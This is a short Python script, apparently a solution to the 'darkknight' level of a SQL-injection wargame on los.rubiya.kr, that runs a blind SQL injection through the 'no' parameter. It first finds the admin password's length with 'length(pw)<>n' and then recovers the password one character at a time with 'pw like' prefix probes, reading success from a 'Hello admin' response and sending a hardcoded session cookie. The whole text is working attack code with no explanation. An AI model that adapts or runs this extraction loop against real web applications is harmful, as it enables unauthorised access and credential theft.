import requests, string

cookies = { "PHPSESSID": "mb1phjh2magaoc9qipl63b4gs6" }

url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"

password_length = 0

success_text = "Hello admin"

for i in range(1,32):
  payload = '1 or id like "admin" and length(pw)<>%s' % (str(i))
  params = {"pw": "pw", "no": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text not in r.text:
    print("Admin Password length is %s" % (str(i)))
    password_length = i
    break

password = ""

for i in range(password_length):
  for c in string.printable:
    payload = '1 or id like "admin" and pw like "{}%"'.format(password+c)
    params = { "pw": "pw", "no": payload }
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      password += c
      print(password)
      break